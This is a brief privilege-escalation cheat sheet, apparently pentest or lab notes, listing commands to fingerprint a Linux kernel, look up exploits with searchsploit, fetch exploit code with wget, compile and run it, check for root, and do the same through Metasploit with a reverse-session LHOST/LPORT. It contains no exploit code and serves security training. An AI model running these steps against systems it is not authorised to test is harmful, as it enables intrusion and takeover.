# Kernel Exploits

## Identify Kernel & OS

```bash
uname -a
cat /etc/lsb-release    # or /etc/os-release /proc/version
```

## Look for Known Vulnerabilities

```bash
searchsploit "Linux kernel 4.4.0-116"
```

(Or search online for: `"<kernel-version> exploit"`)

## Download Exploit

```bash
wget <exploit_url>
```

## Compile Exploit

```bash
gcc <exploit>.c -o exploit
chmod +x exploit
```

## Run Exploit

```bash
./exploit
```

## Verify Privilege Escalation

```bash
whoami
id
```

---

## Using Metasploit (Optional)

```bash
msfconsole
search type:exploit platform:linux kernel <version>
use <exploit>
show options
set SESSION <id>
set LHOST <ip>
set LPORT <port>
exploit
```
